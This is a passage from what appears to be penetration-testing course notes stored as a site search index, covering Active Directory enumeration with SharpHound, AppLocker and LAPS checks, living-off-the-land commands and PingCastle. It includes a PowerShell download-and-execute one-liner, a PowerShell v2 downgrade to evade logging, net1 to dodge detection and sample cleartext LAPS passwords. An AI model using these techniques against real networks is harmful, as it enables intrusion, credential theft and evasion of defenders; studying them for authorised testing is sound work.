.key\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.ppk$|275B|3/31/2022 12:04:40 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\StopTrace.ppk) .ppk\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|301B|3/31/2022 12:09:17 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\WaitClear.key) .key\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.sqldump$|312B|3/31/2022 12:05:30 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\DenyRedo.sqldump) .sqldump\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.sqldump$|310B|3/31/2022 12:05:02 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\AddPublish.sqldump) .sqldump\n2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.legalcorp.local\\WsusContent)\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.keychain$|295B|3/31/2022 12:08:42 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\SetStep.keychain) .keychain\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.tblk$|279B|3/31/2022 12:05:25 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\FindConnect.tblk) .tblk\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.psafe3$|301B|3/31/2022 12:09:33 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\GetUpdate.psafe3) .psafe3\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.keypair$|278B|3/31/2022 12:09:09 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\UnprotectConvertTo.keypair) .keypair\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.tblk$|280B|3/31/2022 12:05:17 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\ExportJoin.tblk) .tblk\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.mdf$|305B|3/31/2022 12:09:27 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\FormatShow.mdf) .mdf\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.mdf$|299B|3/31/2022 12:09:14 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Development\\LockConfirm.mdf) .mdf\n\n&lt;SNIP&gt;\n</code></pre>  BloodHound <p>First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. </p> <pre><code>PS C:\\xyz&gt; .\\SharpHound.exe -c All --zipfilename lcorp\n\n2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022\n2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for legalcorp.local\n2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM\n2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers\n2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM\n2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete\n2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM\n2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186\n2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing\n</code></pre> <p>We can start by typing <code>domain:</code> in the search bar on the top left and choosing <code>legalcorp.local</code> from the results. The query <code>Find Computers with Unsupported Operating Systems</code> is great for finding outdated and unsupported operating systems running legacy software.</p> <p>We will often see users with local admin rights on their host.  We can run the query <code>Find Computers where Domain Users are Local Admin</code> to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.</p>","title":"Credentialed Enumeration - Windows"},{"location":"active_directory/deeper_down_the_rabbithole/enumerating_security_controls/","text":"Windows Defender <p>PowerShell cmdlet Get-MpComputerStatus to get the current Defender status. Here, the <code>RealTimeProtectionEnabled</code> parameter is set to <code>True</code>, which means Defender is enabled on the system.</p> <pre><code>PS C:\\xyz&gt; Get-MpComputerStatus\n\nAMEngineVersion                 : 1.1.17400.5\nAMProductVersion                : 4.10.14393.0\nAMServiceEnabled                : True\nAMServiceVersion                : 4.10.14393.0\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM\nAntispywareSignatureVersion     : 1.323.392.0\nAntivirusEnabled                : True\nAntivirusSignatureAge           : 1\nAntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM\nAntivirusSignatureVersion       : 1.323.392.0\nBehaviorMonitorEnabled          : False\nComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C\nComputerState                   : 0\nFullScanAge                     : 4294967295\nFullScanEndTime                 :\nFullScanStartTime               :\nIoavProtectionEnabled           : False\nLastFullScanSource              : 0\nLastQuickScanSource             : 2\nNISEnabled                      : False\nNISEngineVersion                : 0.0.0.0\nNISSignatureAge                 : 4294967295\nNISSignatureLastUpdated         :\nNISSignatureVersion             : 0.0.0.0\nOnAccessProtectionEnabled       : False\nQuickScanAge                    : 0\nQuickScanEndTime                : 9/3/2020 12:50:45 AM\nQuickScanStartTime              : 9/3/2020 12:49:49 AM\nRealTimeProtectionEnabled       : True\nRealTimeScanDirection           : 0\nPSComputerName                  :\n</code></pre>  AppLocker <p>AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the <code>PowerShell.exe</code> executable, but forget about the other PowerShell executable locations such as <code>%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code> or <code>PowerShell_ISE.exe</code>. We can see that this is the case in the <code>AppLocker</code> rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:</p> <p><code>%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe</code></p> <p>So, we can merely call it from other locations.</p> <pre><code>S C:\\xyz&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\nPathConditions      : {%SYSTEM32%\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa\nName                : Block PowerShell\nDescription         : Blocks Domain Users from using PowerShell on workstations\nUserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513\nAction              : Deny\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 921cc481-6e17-4653-8f75-050b80acca20\nName                : (Default Rule) All files located in the Program Files folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Program Files folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51\nName                : (Default Rule) All files located in the Windows folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : fd686d83-a829-4351-8ff4-27c7de5755d2\nName                : (Default Rule) All files\nDescription         : Allows members of the local Administrators group to run all applications.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n</code></pre>  PowerShell Constrained Language Mode <p>PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.</p> <pre><code>PS C:\\xyz&gt; $ExecutionContext.SessionState.LanguageMode\n\nConstrainedLanguage\n</code></pre>  LAPS <p>The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The LAPSToolkit greatly facilitates this with several functions.</p> <pre><code>PS C:\\xyz&gt; Find-LAPSDelegatedGroups\n\nOrgUnit                                             Delegated Groups\n-------                                             ----------------\nOU=Servers,DC=LEGALCORP,DC=LOCAL                LEGALCORP\\Domain Admins\nOU=Servers,DC=LEGALCORP,DC=LOCAL                LEGALCORP\\LAPS Admins\nOU=Workstations,DC=LEGALCORP,DC=LOCAL           LEGALCORP\\Domain Admins\nOU=Workstations,DC=LEGALCORP,DC=LOCAL           LEGALCORP\\LAPS Admins\nOU=Web Servers,OU=Servers,DC=LEGALCORP,DC=LOCAL LEGALCORP\\Domain Admins\nOU=Web Servers,OU=Servers,DC=LEGALCORP,DC=LOCAL LEGALCORP\\LAPS Admins\nOU=SQL Servers,OU=Servers,DC=LEGALCORP,DC=LOCAL LEGALCORP\\Domain Admins\nOU=SQL Servers,OU=Servers,DC=LEGALCORP,DC=LOCAL LEGALCORP\\LAPS Admins\nOU=File Servers,OU=Servers,DC=LEGALCORP,DC=L... LEGALCORP\\Domain Admins\nOU=File Servers,OU=Servers,DC=LEGALCORP,DC=L... LEGALCORP\\LAPS Admins\nOU=Contractor Laptops,OU=Workstations,DC=LEGALCOF... LEGALCORP\\Domain Admins\nOU=Contractor Laptops,OU=Workstations,DC=LEGALCOF... LEGALCORP\\LAPS Admins\nOU=Staff Workstations,OU=Workstations,DC=LEGALCOF... LEGALCORP\\Domain Admins\nOU=Staff Workstations,OU=Workstations,DC=LEGALCOF... LEGALCORP\\LAPS Admins\nOU=Executive Workstations,OU=Workstations,DC=INL... LEGALCORP\\Domain Admins\nOU=Executive Workstations,OU=Workstations,DC=INL... LEGALCORP\\LAPS Admins\nOU=Mail Servers,OU=Servers,DC=LEGALCORP,DC=L... LEGALCORP\\Domain Admins\nOU=Mail Servers,OU=Servers,DC=LEGALCORP,DC=L... LEGALCORP\\LAPS Admins\n</code></pre> <p>The <code>Find-AdmPwdExtendedRights</code> checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights.\" Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.</p> <pre><code>PS C:\\xyz&gt; Find-AdmPwdExtendedRights\n\nComputerName                Identity                    Reason\n------------                --------                    ------\nEXCHG01.legalcorp.local LEGALCORP\\Domain Admins Delegated\nEXCHG01.legalcorp.local LEGALCORP\\LAPS Admins   Delegated\nSQL01.legalcorp.local   LEGALCORP\\Domain Admins Delegated\nSQL01.legalcorp.local   LEGALCORP\\LAPS Admins   Delegated\nWS01.legalcorp.local    LEGALCORP\\Domain Admins Delegated\nWS01.legalcorp.local    LEGALCORP\\LAPS Admins   Delegated\n</code></pre> <p>We can use the <code>Get-LAPSComputers</code> function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.</p> <pre><code>PS C:\\xyz&gt; Get-LAPSComputers\n\nComputerName                Password       Expiration\n------------                --------       ----------\nDC01.legalcorp.local    6DZ[+A/[]19d$F 08/26/2020 23:29:45\nEXCHG01.legalcorp.local oj+2A+[hHMMtj, 09/26/2020 00:51:30\nSQL01.legalcorp.local   9G#f;p41dcAe,s 09/26/2020 00:30:09\nWS01.legalcorp.local    TCaG-F)3No;l8C 09/26/2020 00:46:04\n</code></pre>","title":"Enumerating Security Controls"},{"location":"active_directory/deeper_down_the_rabbithole/living_off_the_land/","text":"Env Commands For Host &amp; Network Recon <p>Basic Enumeration Commands</p>    Command Result     <code>hostname</code> Prints the PC's Name   <code>[System.Environment]::OSVersion.Version</code> Prints out the OS version and revision level   <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> Prints the patches and hotfixes applied to the host   <code>ipconfig /all</code> Prints out network adapter state and configurations   <code>set %USERDOMAIN%</code> Displays the domain name to which the host belongs (ran from CMD-prompt)   <code>set %logonserver%</code> Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)   <code>systeminfo</code> All of the above in one command     Harnessing PowerShell    Cmd-Let Description     <code>Get-Module</code> Lists available modules loaded for use.   <code>Get-ExecutionPolicy -List</code> Will print the execution policy settings for each scope on a host.   <code>Set-ExecutionPolicy Bypass -Scope Process</code> This will change the policy for our current process using the <code>-Scope</code> parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.   <code>Get-Content C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</code> With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.   <code>Get-ChildItem Env: | ft Key,Value</code> Return environment values such as key paths, users, computer information, etc.   <code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"</code> This is a quick and easy way to download a file from the web using PowerShell and call it from memory.    <p>Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage.</p> <pre><code>PS C:\\xyz&gt; Get-host\n\nName             : ConsoleHost\nVersion          : 5.1.19041.1320\nInstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc\nUI               : System.Management.Automation.Internal.Host.InternalHostUserInterface\nCurrentCulture   : en-US\nCurrentUICulture : en-US\nPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy\nDebuggerEnabled  : True\nIsRunspacePushed : False\nRunspace         : System.Management.Automation.Runspaces.LocalRunspace\n\nPS C:\\xyz&gt; powershell.exe -version 2\nWindows PowerShell\nCopyright (C) 2009 Microsoft Corporation. All rights reserved.\n\nPS C:\\xyz&gt; Get-host\nName             : ConsoleHost\nVersion          : 2.0\nInstanceId       : 121b807c-6daa-4691-85ef-998ac137e469\nUI               : System.Management.Automation.Internal.Host.InternalHostUserInterface\nCurrentCulture   : en-US\nCurrentUICulture : en-US\nPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy\nIsRunspacePushed : False\nRunspace         : System.Management.Automation.Runspaces.LocalRunspace\n\nPS C:\\xyz&gt; get-module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nScript     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}\nManifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...\n</code></pre> <p>We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the <code>PowerShell Operational Log</code> found under <code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code>. All commands executed in our session will log to this file. The <code>Windows PowerShell</code> log located at <code>Applications and Services Logs &gt; Windows PowerShell</code> is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the <code>Windows PowerShell</code> log entries.</p> <p>Examining the Powershell Event Log </p> <p>With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Be aware that the action of issuing the command <code>powershell.exe -version 2</code> within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.</p> <p>Starting V2 Logs </p>  Checking Defenses  <p>Firewall Checks</p> <pre><code>PS C:\\xyz&gt; netsh advfirewall show allprofiles\n</code></pre> <p>Windows Defender Check (from CMD.exe) <pre><code>C:\\xyz&gt; sc query windefend\n</code></pre></p> <p>Check the status and configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.</p> <pre><code>PS C:\\xyz&gt; Get-MpComputerStatus\n</code></pre>  Am I Alone? <p>When landing on a host for the first time, one important thing is to check and see if you are the only one logged in.</p> <pre><code>PS C:\\xyz&gt; qwinsta\n\n SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE\n services                                    0  Disc\n&gt;console           forend                    1  Active\n rdp-tcp                                 65536  Listen\n</code></pre> Network Information    Networking Commands Description     <code>arp -a </code> Lists all known hosts stored in the arp table.   <code>ipconfig /all</code> Prints out adapter settings for the host. We can figure out the network segment from here.   <code>route print</code> Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.   <code>netsh advfirewall show state</code> Displays the status of the host's firewall. We can determine if it is active and filtering traffic.     <p><p>Using <code>arp -a</code> and <code>route print</code> will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.</p></p>   Windows Management Instrumentation (WMI) <p>Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.</p>    Command Description     <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> Prints the patch level and description of the Hotfixes applied   <code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code> Displays basic host information to include any attributes within the list   <code>wmic process list /format:list</code> A listing of all processes on host   <code>wmic ntdomain list /format:list</code> Displays information about the Domain and Domain Controllers   <code>wmic useraccount list /format:list</code> Displays information about all local accounts and any domain accounts that have logged into the device   <code>wmic group list /format:list</code> Information about all local groups   <code>wmic sysaccount list /format:list</code> Dumps information about any system accounts that are being used as service accounts.    <p>This cheatsheet has some useful commands for querying host and domain info using wmic.</p> <pre><code>PS C:\\xyz&gt; wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress\n\nCaption          Description      DnsForestName           DomainControllerAddress  DomainName\nACADEMY-EA-MS01  ACADEMY-EA-MS01\nLEGALCORP    LEGALCORP    legalcorp.local     \\\\172.16.5.5             LEGALCORP\nLOGISTICS        LOGISTICS        legalcorp.local     \\\\172.16.5.240           LOGISTICS\nFREIGHTLOGISTIC  FREIGHTLOGISTIC  LEGALLOGISTICS.LOCAL  \\\\172.16.5.238           FREIGHTLOGISTIC\n</code></pre>  Net Commands <p><code>net.exe</code> commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as <code>whoami</code>, and <code>net localgroup administrators</code>, etc. This could be an obvious red flag to anyone monitoring the network heavily.</p>    Command Description     <code>net accounts</code> Information about password requirements   <code>net accounts /domain</code> Password and lockout policy   <code>net group /domain</code> Information about domain groups   <code>net group \"Domain Admins\" /domain</code> List users with domain admin privileges   <code>net group \"domain computers\" /domain</code> List of PCs connected to the domain   <code>net group \"Domain Controllers\" /domain</code> List PC accounts of domains controllers   <code>net group &lt;domain_group_name&gt; /domain</code> User that belongs to the group   <code>net groups /domain</code> List of domain groups   <code>net localgroup</code> All available groups   <code>net localgroup administrators /domain</code> List users that belong to the administrators group inside the domain (the group <code>Domain Admins</code> is included here by default)   <code>net localgroup Administrators</code> Information about a group (admins)   <code>net localgroup administrators [username] /add</code> Add user to administrators   <code>net share</code> Check current shares   <code>net user &lt;ACCOUNT_NAME&gt; /domain</code> Get information about a user within the domain   <code>net user /domain</code> List all users of the domain   <code>net user %username%</code> Information about the current user   <code>net use x: \\computer\\share</code> Mount the share locally   <code>net view</code> Get a list of computers   <code>net view /all /domain[:domainname]</code> Shares on the domains   <code>net view \\computer /ALL</code> List shares of a computer   <code>net view /domain </code> List of PCs of the domain    <p>Listing Domain Groups <pre><code>PS C:\\xyz&gt; net group /domain\n</code></pre></p> <p>Information about a Domain User <pre><code>PS C:\\xyz&gt; net user /domain wrouse\n</code></pre></p> <p>If we believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string.</p>  Dsquery <p>Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. <code>dsquery</code> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the <code>dsquery</code> DLL exists on all modern Windows systems by default now and can be found at <code>C:\\Windows\\System32\\dsquery.dll</code>.</p> <p>All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a <code>SYSTEM</code> context.</p> <pre><code>PS C:\\xyz&gt; dsquery user\n\n\"CN=Administrator,CN=Users,DC=LEGALCORP,DC=LOCAL\"\n\"CN=Guest,CN=Users,DC=LEGALCORP,DC=LOCAL\"\n</code></pre> <pre><code>PS C:\\xyz&gt; dsquery computer\n\n\"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=LEGALCORP,DC=LOCAL\"\n\"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=LEGALCORP,DC=LOCAL\"\n\"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=LEGALCORP,DC=LOCAL\"\n\"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=LEGALCORP,DC=LOCAL\"\n</code></pre> <p>We can use a dsquery wildcard search to view all objects in an OU, for example.</p> <pre><code>PS C:\\xyz&gt; dsquery * \"CN=Users,DC=LEGALCORP,DC=LOCAL\"\n\n\"CN=Users,DC=LEGALCORP,DC=LOCAL\"\n\"CN=krbtgt,CN=Users,DC=LEGALCORP,DC=LOCAL\"\n\"CN=Domain Computers,CN=Users,DC=LEGALCORP,DC=LOCAL\"\n&lt;SNIP&gt;\n</code></pre> <p>We can combine <code>dsquery</code> with LDAP search filters of our choosing. The below looks for users with the <code>PASSWD_NOTREQD</code> flag set in the <code>userAccountControl</code> attribute.</p> <p>Users With Specific Attributes Set (PASSWD_NOTREQD)</p> <pre><code>PS C:\\xyz&gt; dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n\n  distinguishedName                                                                              userAccountControl\n  CN=Guest,CN=Users,DC=LEGALCORP,DC=LOCAL                                                    66082\n  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL      66080\n</code></pre> <p>The below search filter looks for all Domain Controllers in the current domain, limiting to five results.</p> <pre><code>PS C:\\Users\\forend.LEGALCORP&gt; dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n\n sAMAccountName\n ACADEMY-EA-DC01$\n</code></pre> LDAP Filtering Explained <p>Strings such as <code>userAccountControl:1.2.840.113556.1.4.803:=8192</code> are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others.</p> <p><code>userAccountControl:1.2.840.113556.1.4.803:</code> Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values when searching for information in AD (also known as Object Identifiers (OIDs). <code>=8192</code> represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like <code>password is not required</code> or <code>account is locked</code> is set. These values can compound and make multiple different bit entries.</p> <p></p> OID match strings <p>OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:</p> <ol> <li> <code>1.2.840.113556.1.4.803</code> </li> </ol> <p>When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.</p> <ol> <li> <code>1.2.840.113556.1.4.804</code> </li> </ol> <p>When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.</p> <ol> <li> <code>1.2.840.113556.1.4.1941</code> </li> </ol> <p>This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.</p> Logical Operators <p>When building out search strings, we can utilize logical operators to combine values for the search. The operators <code>&amp;</code> <code>|</code> and <code>!</code> are used for this purpose. For example we can combine multiple search criteria with the <code>&amp; (and)</code> operator like so: <code>(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))</code></p> <p>The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like <code>(&amp;(1) (2) (3))</code>. The <code>!</code> (not) and <code>|</code> (or) operators can work similarly. For example, our filter above can be modified as follows: <code>(&amp;(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))</code></p> <p>This would search for any user object that does <code>NOT</code> have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.</p>","title":"Living Off The Land"},{"location":"active_directory/defensive_considerations/additional_auditing_techniques/","text":"<p>We want to provide our customers with as much information as possible to help solve the potential issues we find. Doing so will give them more data to prove they have a problem and help acquire backing and funding to tackle those fixes.</p>  Creating an AD Snapshot with Active Directory Explorer <p>AD Explorer is part of the Sysinternal Suite and is described as:</p> <p>\"An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to navigate an AD database easily, define favorite locations, view object properties, and attributes without opening dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute.\"</p>  PingCastle <p>PingCastle is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the Capability Maturity Model Integration (CMMI). For a quick look at the help context provided, you can issue the <code>--help</code> switch in cmd-prompt.</p> <pre><code>C:\\xyz&gt; PingCastle.exe --help\n\nswitch:\n  --help              : display this message\n  --interactive       : force the interactive mode\n  --log               : generate a log file\n  --log-console       : add log to the console\n  --log-samba &lt;option&gt;: enable samba login (example: 10)\n\nCommon options when connecting to the AD\n  --server &lt;server&gt;   : use this server (default: current domain controller)\n                        the special value * or *.forest do the healthcheck for all domains\n  --port &lt;port&gt;       : the port to use for ADWS or LDAP (default: 9389 or 389)\n  --user &lt;user&gt;       : use this user (default: integrated authentication)\n  --password &lt;pass&gt;   : use this password (default: asked on a secure prompt)\n  --protocol &lt;proto&gt;  : selection the protocol to use among LDAP or ADWS (fastest)\n                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS\n\n&lt;SNIP&gt;  \n</code></pre> <p>To run PingCastle, we can call the executable by typing <code>PingCastle.exe</code> into our CMD or PowerShell window or by clicking on the executable, and it will drop us into interactive mode, presenting us with a menu of options inside the <code>Terminal User Interface</code> (<code>TUI</code>).</p> <pre><code>|:.      PingCastle (Version 2.10.1.0     1/19/2022 8:12:02 AM)\n|  #:.   Get Active Directory Security at 80% in 20% of the time\n# @@  &gt;  End of support: 7/31/2023\n| @@@:\n: .#                                 Vincent LE TOUX (contact@pingcastle.com)\n  .:       twitter: @mysmartlogon                    https://www.pingcastle.com\nWhat do you want to do?\n=======================\nUsing interactive mode.\nDo not forget that there are other command line switches like --help that you can use\n  1-healthcheck-Score the risk of a domain\n  2-conso      -Aggregate multiple reports into a single one\n  3-carto      -Build a map of all interconnected domains\n  4-scanner    -Perform specific security checks on workstations\n  5-export     -Export users or computers\n  6-advanced   -Open the advanced menu\n  0-Exit\n==============================\nThis is the main functionnality of PingCastle. In a matter of 